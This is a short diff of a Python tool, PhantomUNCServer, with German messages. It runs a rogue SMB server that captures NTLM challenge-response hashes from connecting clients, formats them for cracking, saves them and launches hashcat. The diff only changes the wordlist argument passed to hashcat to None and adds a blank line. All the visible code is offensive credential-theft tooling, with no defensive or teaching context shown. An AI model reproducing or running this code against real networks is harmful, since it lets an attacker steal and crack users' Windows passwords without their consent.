@@ -59,7 +59,7 @@ class PhantomUNCServer(SimpleSMBServer):
             hash_string = f"{username}::{domain}:{challenge.hex()}:{response.hex()}"
             print(f"{GREEN}🔑 Hash erhalten von {clientIP}: {hash_string}{RESET}")
             save_hash(hash_string)
-            run_hashcat(wordlist_path=args.wordlist)
+            run_hashcat(wordlist_path=None)
         except Exception as e:
             print(f"{RED}❌ Fehler beim Parsen der NTLM-Authentifizierung: {e}{RESET}")
 
@@ -170,3 +170,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+
